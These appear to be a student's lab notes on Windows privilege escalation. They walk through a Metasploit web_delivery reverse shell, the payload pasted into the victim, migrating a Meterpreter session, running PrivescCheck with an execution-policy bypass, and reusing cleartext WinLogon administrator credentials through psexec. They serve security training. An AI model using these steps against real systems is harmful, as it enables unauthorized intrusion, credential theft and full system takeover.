Identifying the Windows Vulnerabilities

- Once we obtain access to the target system with the privileges of NT Authority\System there is no need for us to keep on going with the Privilege escalation techniques. Let us assume that we got regular access then chances are that we might have to get highest privileges on the target system. In order to do so the following techniques will help you.
- In order to elevate your privileges on Windows, you must first, identify privilege escalation vulnerabilities that exist on the target system.
- This process will differ greatly based on the type of target you gain access to. Privilege escalation on Windows can be performed through a plethora of techniques based on the version of Windows and the system's unique configuration
- This process can be quite tedious and time consuming and as a result, it is recommeneded to automate the process of identifying privilege escalation vulnerabilities. This can be done through the use of various automation scripts
- PrivescCheck - This script aims to enumerate common Windows configuration issues that can be leveraged for local privilege escalation. It also gathers various information that might be useful for exploitation and/or post exploitation
	- Github: https://github.com/itm4n/PrivescCheck


Lab details:
- This is a GUI based lab environment. We have access to both kali and victim machine the target IP is listed on Kali destop target file.
- In this lab we are exploiting a web delivery vulnerability and it can be exploited using msfconsole and search for web delivery
- use exploit/multi/script/web_delivery and for the information on the module simply type info command
- set target to PSH\ (Binary) and set payload windows/shell/reverse_tcp as well as PSH-EncodedCommand to false and finally Lhost as attacker IP
- Once the powershell code is generated copy all that code and open a command prompt in the target machine and paste the command that we copied from the module and hit enter do not worry if the command prompt is closed 
- Now check your attack machine we get a command shell session
- If we launch the session and check the user using the command `whoami`
- If it is not NT Authority\System we need to perform privilege escalation the sole purpouse of the lab
- We will migrate the session to a meterpreter session. We can do it in two ways you can refer that in the metasploit framework end module.
- `session -u <sessionId>` using this command we can upgrade the shell session to meterpreter session. 
- launch the merterpreter session and use the command `sysinfo` and based on the version of the OS upgrade the session to 64 bit 
- `pgrep explorer.exe` to get the ProcessID (PID) `migrate PID_of_explorer` 
- `get privs` to check the user privileges that we currently have
- Navigate to the root and to the home directory of the student and already the privesc script folder is present we can move into that folder
- Once we are in that folder we can run the appropriate command based on the shell access that we have as we have got the command shell in this lab the command listed in the official github repository is `powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"`


Windows Privilege Escalation

- It is a continuation of the previous lab as we observed that in the previous lab that the only vulnerability is `winlogon` and we got the credentials `Username: administrator and password: hello_123321`
- What does and WinLogon do > It will parse the WinLogon registry keys and check whether they contain any clear text password. Entries that have an empty password field are filtered out.
- By default every Windows system comes in pre packaged with SMB as part of all the serices installed it allows user to authenticate with SMB we will utilize the python implementation of psexec utility to authenticate.
	- With the password that we obtained we can try to login using the psexec utility and the format is `psexec.py {user}@{targetIP}` and provide password.
	- Once logged in we get the terminal as a Administrator with all the privileges.
- The same can be done from within the metasploit framework
	- search for the psexec module in msfconsole
	- `use exploit/windows/smb/psexec` and set the values and hit enter
	- The advantage of getting this is we get meterpreter session be it 32 bit we can upgrade it with a explorer.exe PID
- After obtaining the user account credentials we can use these protocols to authenticate with Windows target
	- SMB
	- WinRM
	- RDP
